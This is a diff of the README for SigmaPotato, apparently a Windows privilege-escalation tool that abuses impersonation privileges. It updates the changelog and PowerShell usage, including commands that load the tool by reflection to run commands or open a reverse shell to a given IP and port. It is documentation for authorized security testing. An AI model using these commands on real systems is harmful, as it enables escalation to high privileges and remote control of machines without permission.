@@ -47,14 +47,27 @@ and output verbosity for a more intuitive and effective user experience.
     o (process outputting and usage help vastly improved)
 ```
 
+### v1.2.5
+```
+[+] Streamlined usage when using .NET reflection.
+    o (e.g., can now be executed via '[SigmaPotato]::Main("<command">')
+    
+[+] Improved reverse shell stability and verbosity.
+    o (better error correction and now intercepts console data streams)
+    
+[+] Further refined visual formatting.
+    o (cleaned up help message, hints, and general output)
+    
+```
+
 ### Work-in-Progress (WIP)
 ```
 [+] Introduce '--interactive' process support.
     o (this will require 'SeAssignPrimaryTokenPrivilege')
     
-[+] Streamline usage when using .NET reflection.
-    o (e.g., adjust namespace allowing execution like '[SigmaPotato]::Main("<command>")')
-    o (find workaround for current reflection stdout processing, aka environmental variables) 
+[+] Save process output to exported environment variable.
+    o (save output of the execute process/command to "$env:SigmaOutput")
+    o (will likely only be applicable when using reflection) 
 ```
 
 
@@ -137,17 +150,18 @@ Once the ``SigmaPotato`` namespace has been loaded into the current session, you
 
 ```powershell
 # Execute a Command
-[SigmaPotato.Program]::Main("<command>")
+[SigmaPotato]::Main("<command>")
 
 
 # Establish a PowerShell Reverse Shell
 $RevShell = @("--revshell", "<ip_addr>", "<port>")
-[SigmaPotato.Program]::Main($RevShell)
+[SigmaPotato]::Main($RevShell)
 
 
 # Establish a PowerShell Reverse Shell (one-liner)
-[SigmaPotato.Program]::Main(@("--revshell","<ip_address>","<port>"))
+[SigmaPotato]::Main(@("--revshell","<ip_address>","<port>"))
 ```
+- Note: as of ``v1.2.5``, execution no longer requires ``[SigmaPotato.Program]``
 
 ### Error Correction <a name="errorCorrection"></a>
 ---
@@ -163,21 +177,24 @@ PS C:\Users\JoeSchmoe> .\SigmaPotato.exe
 
 PS C:\Users\JoeSchmoe> .\SigmaPotato.exe cmd.exe /c whoami
 [-] Unexpected arguments detected.  Use '--help' for usage information.
-    o (Hint: You might need to wrap your arguments in quotations.)
+ o  (Hint: you might need to wrap your arguments in quotations)
 
 
 PS C:\Users\JoeSchmoe> .\SigmaPotato.exe --revshell
 [-] Reverse shell functionality is missing arguments.  Use '--help' for usage information.
-    o (Hint: You need to specify an IP address and port.)
+ o  (Hint: you need to specify an IP address and port)
 ```
 
 **Invalid filename (or filename not in the default path).**
+
 ![Invalid Filename](https://media.discordapp.net/attachments/855920119292362802/1142298026640162848/image.png)
 
 **Command likely exceeds the character limit (but PowerShell commands should bypass this).**
+
 ![Command Too Long](https://media.discordapp.net/attachments/855920119292362802/1142298315539615754/image.png)
 
 **User does not have 'SeImpersonatePrivilege' or 'SeAssignPrimaryTokenPrivilege' user rights.**
+
 ![Invalid Privileges](https://media.discordapp.net/attachments/855920119292362802/1142301106479837345/image.png)
 
 
